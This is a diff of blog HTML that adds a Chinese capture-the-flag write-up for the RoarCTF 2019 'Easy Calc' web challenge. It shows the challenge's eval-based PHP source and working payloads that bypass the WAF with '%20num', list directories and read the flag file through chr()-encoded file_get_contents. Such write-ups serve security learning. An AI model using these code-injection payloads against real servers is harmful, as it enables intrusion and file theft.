@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>XYTK&#39;s Blog</title>
+    <title>【wp】[RoarCTF 2019]Easy Calc · XYTK&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >XYTK&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【wp】[RoarCTF 2019]Easy Calc</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>XYTK's Blog</a>
 </header>
@@ -220,24 +231,76 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            【wp】[RoarCTF 2019]Easy Calc
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">444</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/18</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,44 +401,75 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/07/Python实现SPN加解密/" >
-            
-                <span>【转载】Python实现SPN加解密</span>
-        </a>
-        <div class="abstract-content">
-            前言原文地址：https://gooong.cn/post/cryptography-part1/
-SPN网络难道不是要介绍AES吗，怎么会变成SPN网络，这是啥？可以吃吗？  
-AES、DES等很多现代对称加密方法的核心就是SPN网络，它是代换-置换网络（Substitution-Permutation Network）的缩写,是现代对称加密方法设计的蓝本。可以说，了解SPN网络，就基本了解了AES。  
-很巧的是，这个网络正好是容易理解的。SPN网络的思想很简单：既然加密一次不够安全，那我就加密多次，把第一次加密产生的密文再进行加密，解密的时候我连续进行两次解密就可以了，这样是不是就...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "python">python</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计、Bypass</p>
+<p>比赛的时候稍微有点懵，我还是太菜了。</p>
+<p>题目链接： <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p>
+<p>参考链接： </p>
+<p>利用PHP的字符串解析特性Bypass： <a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
+<p>PHP去参数实现RCE：</p>
+<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir</a></p>
+<p><a href="https://www.guildhab.top/?p=1024" target="_blank" rel="noopener">https://www.guildhab.top/?p=1024</a></p>
+<hr>
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="RoarCTF-2019-Easy Calc"></a>RoarCTF-2019-Easy Calc</h1><p>发现js代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    //对输入的特殊字符进行URL编码并以GET方式访问请求</span><br><span class="line">    $(&apos;#calc&apos;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),      </span><br><span class="line">            type:&apos;GET&apos;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问calc.php，发现对参数的过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">        $str = $_GET[&apos;num&apos;]; </span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;]; </span><br><span class="line">        foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123; </span><br><span class="line">                        die(&quot;what are you want to do?&quot;); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>刚开始以为是SSTI，试了半天发现行不通，然后经测试发现不允许输入特殊字符和字母(会弹出：这啥？算不来)，只允许输入计算式。</p>
+<p>calc.php?%20num=1;aaa 不会报错，即可以绕过WAF对字母的限制。</p>
+<blockquote>
+<p>%20num在WAF中是%20num，在server中是num，接下来绕过calc.php中的过滤。</p>
+</blockquote>
+<p>使用无参数的PHP函数(参照上面的链接)构造payload:</p>
+<blockquote>
+<p>calc.php?%20num=1;var_dump(scandir(dirname(dirname(dirname(getcwd())))))</p>
+</blockquote>
+<p>得到：</p>
+<img src="/2019/10/18/【wp】-RoarCTF-2019-Easy-Calc/calc1.png" title="XYTK">
+
+<blockquote>
+<p>payload:<br>改变file_get_contents(“/f1agg”)的形式绕过<br>calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p>
+</blockquote>
+
     </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/" title= "【wp】bugku-login4&CBC字节翻转攻击">
+                    <div class="nextTitle">【wp】bugku-login4&CBC字节翻转攻击</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/16/推荐一些大佬的博客-持续更新/" title= "推荐一些大佬的博客(持续更新)">
+                    <div class="prevTitle">推荐一些大佬的博客(持续更新)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -471,6 +565,24 @@ AES、DES等很多现代对称加密方法的核心就是SPN网络，它是代�
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">2.</span> <span class="toc-text">RoarCTF-2019-Easy Calc</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -750,6 +862,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
